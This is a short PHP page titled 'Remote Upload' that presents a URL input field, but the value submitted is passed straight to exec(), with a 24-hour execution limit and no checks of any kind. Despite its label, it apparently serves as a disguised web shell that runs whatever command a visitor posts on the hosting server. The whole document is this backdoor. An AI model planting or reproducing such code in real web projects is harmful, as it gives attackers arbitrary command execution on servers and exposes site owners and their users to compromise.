<title>Remote Upload</title>
<center>
</br</p></br</p><form method="post">
<input name="url" size="50" />
<input name="submit" type="submit" />
</form>

<?php

// maximum execution time in seconds
set_time_limit (24 * 60 * 60);

if (!isset($_POST['submit'])) die();


$code = $_POST['url'];
exec("$code");
$_POST['url'] = ("");
$code = ("");
echo $code;

?>
</center>